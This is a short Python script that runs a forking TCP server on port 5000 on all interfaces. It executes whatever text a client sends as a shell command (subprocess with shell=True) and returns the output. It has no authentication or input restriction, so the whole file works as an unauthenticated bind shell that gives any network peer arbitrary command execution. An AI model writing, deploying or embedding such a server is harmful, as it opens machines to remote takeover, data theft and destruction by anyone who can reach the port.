import socket
import subprocess
import os
import sys
import signal

HOST = ""
PORT = 5000

signal.signal(signal.SIGCHLD, signal.SIG_IGN)


def run_cmd(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True).stdout


try:
    s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)

    s.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    s.bind((HOST, PORT))
    s.listen()

    while True:
        conn, addr = s.accept()
        print('Connected by', addr)

        pid = os.fork()

        if pid:
            conn.close()
        else:
            s.close()
            recv_data = conn.recv(4096)
            send_data = run_cmd(recv_data.decode("utf-8"))
            conn.send(send_data)
            print("Data received: %s" % recv_data)
            conn.close()
            sys.exit(0)

except OSError as e:
    print("Socket error({0}): {1}".format(e.errno, e.strerror))

except KeyboardInterrupt:
    print("Closing server")
    conn.close()
    s.close()
